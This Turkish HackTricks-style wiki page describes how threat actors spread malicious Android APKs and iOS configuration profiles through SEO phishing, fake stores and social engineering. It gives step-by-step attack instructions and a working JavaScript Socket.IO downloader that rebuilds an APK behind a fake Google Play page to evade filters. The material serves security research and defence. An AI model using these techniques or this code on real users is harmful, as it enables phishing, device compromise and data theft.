# Mobil Phishing ve Zararlı Uygulama Dağıtımı (Android ve iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Bu sayfada, tehdit aktörlerinin **zararlı Android APK’larını** ve **iOS mobil yapılandırma profillerini** phishing (SEO, sosyal mühendislik, sahte mağazalar, arkadaşlık uygulamaları vb.) yoluyla dağıtmak için kullandığı teknikler ele alınmaktadır.
> İçerik, Zimperium zLabs tarafından ortaya çıkarılan SarangTrap kampanyasından (2025) ve diğer kamuya açık araştırmalardan uyarlanmıştır.<sup>[[1]](#references)</sup>

## Saldırı Akışı

1. **SEO/Phishing Altyapısı**
   * Benzer görünümlü onlarca alan adı kaydedin (arkadaşlık, bulut paylaşımı, araç hizmeti vb.).  
     – Google’da üst sıralarda yer almak için `<title>` öğesinde yerel dilde anahtar kelimeler ve emojiler kullanın.  
     – Aynı açılış sayfasında hem Android (`.apk`) hem de iOS yükleme talimatları barındırın.
2. **İlk Aşama İndirmesi**
   * Android: *imzalanmamış* veya “üçüncü taraf mağaza” APK’sına doğrudan bağlantı.  
   * iOS: Kötü amaçlı bir **mobileconfig** profiline yönlendiren `itms-services://` veya düz HTTPS bağlantısı (aşağıya bakın).
3. **Android Kurulum Sonrası Davranış**
   * C2 kontrollü çalıştırma, izinlerin kötüye kullanılması, dropper atlatmaları, arka planda veri toplama ve kurulum sonrası diğer kötü amaçlı yazılım davranışları aşağıdaki özel Android Malware Post-Exploitation sayfasında ele alınmaktadır.
4. **iOS Dağıtım Tekniği**
   * Tek bir **mobil yapılandırma profili**, cihazı “MDM” benzeri denetime almak için `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` vb. isteyebilir.  
   * Sosyal mühendislik talimatları:
     1. Settings ➜ *Profile downloaded* bölümünü açın.
     2. *Install* düğmesine üç kez dokunun (phishing sayfasındaki ekran görüntüleriyle yönlendirilir).  
     3. İmzalanmamış profile güvenin ➜ saldırgan, App Store incelemesinden geçmeden *Contacts* ve *Photo* yetkilerini kazanır.
5. **iOS Web Clip Payload’u (phishing uygulaması simgesi)**
   * `com.apple.webClip.managed` payload’ları, markalı bir simge/etiketle **bir phishing URL’sini Ana Ekrana sabitleyebilir**.
   * Web Clip’ler **tam ekran** çalışabilir (tarayıcı arayüzünü gizler) ve **kaldırılamaz** olarak işaretlenebilir; böylece simgeyi kaldırmak için kurbanın profili silmesi gerekir.<sup>[[3]](#references)</sup>
6. **Ağ Katmanı**
   * Düz HTTP; genellikle 80 numaralı portta, `api.<phishingdomain>.com` gibi bir HOST başlığıyla.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS yok → tespit etmesi kolay).

## Android Malware Post-Exploitation

C2, Accessibility’nin kötüye kullanılması, overlay’ler, ATS otomasyonu, aşamalı DEX yükleme, premium SMS ve kalıcılık gibi kurulum sonrası Android malware tradecraft’i için şu sayfaya bakın:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket Tabanlı APK Kaçakçılığı + Sahte Google Play Sayfaları

Saldırganlar, statik APK bağlantıları yerine giderek daha sık Google Play’i andıran tuzaklara gömülü Socket.IO/WebSocket kanalları kullanıyor. Bu yöntem payload URL’sini gizler, URL/uzantı filtrelerini atlatır ve gerçekçi bir yükleme deneyimi sunar.<sup>[[2]](#references)[[4]](#references)</sup>

Gerçek saldırılarda gözlemlenen tipik istemci akışı:

<details>
<summary>Sahte Play Socket.IO indiricisi (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Basit kontrolleri neden atlatır:
- Statik bir APK URL'si açığa çıkmaz; payload, WebSocket frame'lerinden bellekte yeniden oluşturulur.
- Doğrudan .apk yanıtlarını engelleyen URL/MIME/uzantı filtreleri, WebSockets/Socket.IO üzerinden tünellenen ikili verileri gözden kaçırabilir.
- WebSockets'i çalıştırmayan crawler'lar ve URL sandbox'ları payload'ı alamaz.

Ayrıca WebSocket tradecraft ve araçlara bakın:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Romantizmin Karanlık Yüzü: SarangTrap Şantaj Kampanyası](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Apple cihazları için Web Clips payload ayarları](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Endonezyalı ve Vietnamlı Android kullanıcılarını hedefleyen Banker Trojan](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
